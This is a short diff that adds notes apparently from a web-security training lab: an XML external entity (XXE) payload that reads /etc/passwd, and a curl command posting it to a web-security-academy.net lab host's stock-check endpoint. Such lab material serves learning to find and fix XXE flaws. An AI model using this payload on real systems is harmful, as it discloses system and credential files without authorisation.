@@ -1,0 +1,10 @@
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0aa8002a048613768083c19e00e10062.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Content-Length: 171' \
+    --data-binary $'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>' \
+    $'https://0aa8002a048613768083c19e00e10062.web-security-academy.net/product/stock'
